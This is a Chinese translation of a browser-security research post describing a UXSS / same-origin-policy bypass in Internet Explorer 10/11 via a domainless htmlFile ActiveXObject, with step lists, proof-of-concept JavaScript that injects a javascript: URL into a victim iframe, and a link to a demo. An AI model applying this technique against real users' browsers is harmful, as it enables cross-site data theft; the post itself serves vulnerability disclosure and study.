# 【技术分享】在IE上绕过UXSS/SOP：再次探索无域的世界

## 译文声明
本文为翻译文章，原文来源：brokenbrowser.com
原文地址：[原文链接](https://www.brokenbrowser.com/uxss-ie-domainless-world/)
译文仅供参考，具体内容和含义以原文为准。

## 翻译信息
- 翻译者：[scriptkid](http://bobao.360.cn/member/contribute?uid=2529059652)
- 稿费：100RMB
- 投稿方式：发送邮件至linwei#360.cn，或登录网页版在线投稿

## 前言
几个月前，我们在Edge浏览器中探讨了关于[无域的about:blank页面](https://www.brokenbrowser.com/uxss-edge-domainless-world/)的问题。简而言之，一个强大的about:blank文档可以无限制地访问任何域。该问题已在最近针对CVE-2017-0002的补丁中得到修复，因此不再有效。同样，由[ActiveXObject/htmlFile](https://www.brokenbrowser.com/uxss-ie-htmlfile/)引起的问题也在上周发布的CVE-2017-0154补丁中得到了修复。如果你还没有阅读过之前提到的两种UXSS/SOP绕过方法的文章，请先查阅，因为接下来的内容将假设你已经熟悉这两种方法。我们的目标是将之前在Edge上的漏洞利用移植到IE上，这相对容易，因为微软对IE的修复并不彻底。首先，我们来看一下这些漏洞当前的状态。

## 在IE上创建无域的about:blank
在之前的bug中，我们使用data:uri来创建一个无域的about:blank页面。那么，在IE上如何实现相同的效果呢？htmlFile对象可以帮助我们，尽管补丁阻止了我们将域设置为任意值，但我们仍然可以将其设置为blank或无域。

为了创建一个无域的htmlFile，我们需要一个被销毁的document，即document将不复存在。以下是具体步骤：

1. 保存iframe中ActiveXObject的引用。
2. 至少实例化一次htmlFile（这样IE就不会销毁它）。
3. 阻断iframe进程（这样IE就没有机会销毁我们的引用）。
4. 销毁iframe的document（使用document.open）。
5. 再次实例化htmlFile，现在它是无域的了。

步骤2和3在这里非常重要。缺少步骤2将导致我们无法保存一个可用的引用，而缺少步骤3则会使IE有机会销毁相应的对象。我们之前已经在[这篇文章](https://www.brokenbrowser.com/uxss-ie-htmlfile/)中提到过线程阻断的思路。接下来，我们将使用一种非常直观的技术——弹框来进行线程阻断。

### 创建无域的htmlFile
```javascript
// 我们将攻击下面的iframe
document.body.insertAdjacentHTML('beforeEnd', '<iframe id="ifr"></iframe>');
var ifr = document.getElementById('ifr').contentWindow;

// 保存iframe中ActiveXObject的引用
var ifr_ActiveXObject = ifr.ActiveXObject;

// 确保IE不会使我们的引用无效
new ifr_ActiveXObject("htmlFile"); // 我们甚至不需要保存这个实例

// 阻断iframe，防止ActiveXObject对象被销毁
ifr.setTimeout('alert("请不要关闭此弹框，直到PoC完成。");');
```

请注意，我们使用setTimeout来执行阻断弹框。这是因为我们还需要继续进行其他操作，如果直接在iframe中弹出对话框，将会阻断UI并导致后续代码无法执行。我们的目标是在弹框期间销毁iframe的内容。记住，弹框的作用是阻止IE销毁ActiveXObject。

### 销毁iframe的document并创建无域的htmlFile
```javascript
// 销毁iframe的document
ifr.document.open();

// 实例化一个无域的htmlFile
var domainlessDoc = new ifr_ActiveXObject("htmlFile");
```

现在，我们有了一个无域的htmlFile。接下来，我们需要加载一个包含我们要访问的URL的iframe。具体做法在之前的[冒险在无域的世界](https://www.brokenbrowser.com/uxss-edge-domainless-world/)文章中有详细说明。实质上，我们通过iframe加载任意网站，并将其修改为about:blank（iframe所属域）。然后，我们就可以通过无域的htmlFile随意访问该blank页面，从而绕过SOP。

### 注入代码到受害者的内嵌iframe
```javascript
// 向受害者的内嵌iframe注入代码
domainlessDoc.parentWindow.setTimeout("victim_iframe[0].location = 'javascript:alert(parent.location.href)';", 1000);
```

上述方法适用于IE10和IE11，只需稍作调整即可适用于IE6到IE11。我们不会在这里进行调整，但如果你真的感兴趣，请[让我知道](https://twitter.com/magicmac2000)。

[**[IE10/11上的PoC]**](http://www.cracking.com.ar/demos/ieuxssdomainless)

记住，htmlFile还有许多未被发现的玩法，我相信这值得你在一个下雨的下午花时间去研究。在我看来，修复与htmlFile相关的bug的最佳方法是完全禁止其在iexplore.exe中的实例化。

```javascript
// 如果这段代码返回ACCESS_DENIED，攻击者将失去一个强大的武器
new ActiveXObject("htmlFile");  // 不再允许这样做！
```

希望这篇优化后的文章能帮助你更好地理解如何在IE上绕过UXSS/SOP。